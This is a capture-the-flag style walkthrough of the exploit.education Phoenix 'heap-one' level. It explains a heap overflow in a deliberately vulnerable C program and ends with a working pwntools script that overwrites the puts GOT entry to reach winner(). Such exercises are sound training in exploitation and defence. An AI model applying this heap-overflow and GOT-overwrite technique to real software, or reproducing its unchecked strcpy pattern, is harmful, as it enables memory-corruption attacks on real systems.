---
description: 'http://exploit.education/phoenix/heap-one/'
---

# heap1

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

struct heapStructure {
  int priority;
  char *name;
};

int main(int argc, char **argv) {
  struct heapStructure *i1, *i2;

  i1 = malloc(sizeof(struct heapStructure));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct heapStructure));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}

void winner() {
  printf(
      "Congratulations, you've completed this level @ %ld seconds past the "
      "Epoch\n",
      time(NULL));
}
```

## Analysis

This program:

* Allocates a chunk on the heap for the `heapStructure`
* Allocates another chunk on the heap for the `name` of that `heapStructure`
* Repeats the process with another `heapStructure`
* Copies the two command-line arguments to the `name` variables of the `heapStructures`
* Prints something

### Regular Execution

Let's break on and after the first `strcpy`.

```text
$ r2 -d -A heap1 AAAA BBBB
```

![](../../../.gitbook/assets/image%20%287%29.png)

As we expected, we have two pairs of `heapStructure` and `name` chunks. We know the `strcpy` will be copying into wherever `name` points, so let's read the contents of the first `heapStructure`. Maybe this will give us a clue.

![](../../../.gitbook/assets/image%20%288%29.png)

Look! The `name` pointer points to the `name` chunk! You can see the value `0x602030` being stored.

This isn't particularly a revelation in itself - after all, we **knew** there was a pointer in the chunk. But now we're certain, and we can _definitely_ overwrite this pointer due to the lack of bounds checking. And because we can also control the value being **written**, this essentially gives us an arbitrary write!

And where better to target than the GOT?

## Exploitation

The plan, therefore, becomes:

* Pad until the location of the pointer
* Overwrite the pointer with the GOT address of a function
* Set the second parameter to the address of `winner`
* Next time the function is called, it will call `winner` 

But what function should we overwrite? The only function called after the `strcpy` is `printf`, according to the source code. And if we overwrite `printf` with `winner` it'll just recursively call itself forever.

Luckily, compilers like `gcc` compile `printf` as `puts` if there are no parameters - we can see this with radare2:

```text
$ r2 -d -A heap1
$ s main; pdf
[...]
0x004006e6      e8f5fdffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
0x004006eb      bfa8074000     mov edi, str.and_that_s_a_wrap_folks ; 0x4007a8 ; "and that's a wrap folks!"
0x004006f0      e8fbfdffff     call sym.imp.puts
```

So we can simply overwrite the GOT address of `puts` with `winner`. All we need to find now is the padding until the pointer and then we're good to go.

```text
$ ragg2 -P 200 -r
AABAA...
```

```text
$ r2 -d -A heap1 AAABAA... 0000
```

Break on and after the `strcpy` again and analyse the second chunk's `name` pointer.

![](../../../.gitbook/assets/image%20%286%29.png)

The pointer is originally at `0x8d9050`; once the strcpy occurs, the value there is `0x41415041414f4141`.

```text
[0x004006cd]> wopO 0x41415041414f4141
40
```

The offset is **40**.

### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./heap1', checksec=False)

param1 = (b'A' * 40 + p64(elf.got['puts'])).replace(b'\x00', b'')
param2 = p64(elf.sym['winner']).replace(b'\x00', b'')

p = elf.process(argv=[param1, param2])

print(p.clean().decode('latin-1'))
```

Again, null bytes aren't allowed in parameters so you have to remove them.

